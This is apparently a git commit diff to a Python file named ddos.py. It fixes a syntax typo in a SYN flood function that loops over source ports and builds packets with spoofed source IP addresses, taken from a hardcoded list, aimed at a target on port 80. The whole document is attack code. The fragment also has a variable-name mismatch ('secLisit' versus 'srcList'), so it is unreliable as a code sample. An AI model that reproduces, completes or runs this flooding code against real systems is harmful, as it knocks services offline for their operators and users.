7f5492b7064434d4b4b02244f2c401f7afb56bcc
smallwhiteAli <51260810+smallwhiteAli@users.noreply.github.com>
2021-01-28 08:51:25 +0800

    Create ddos.py

--- ddos.py
+++ ddos.py
@@ -10,7 +10,7 @@ dPort = 80
 
 def synFlood(tgt,dPort):
 	secLisit = ['1.1.1.1','22.222.22.2','33.255.33.4','184.1.1.1',]
-	for sPort in range(1024.65535):
+	for sPort in range(1024,65535):
 		index = random.randrange(4)
 
 		ipLayer = IP(src=srcList[index],dst=tgt)
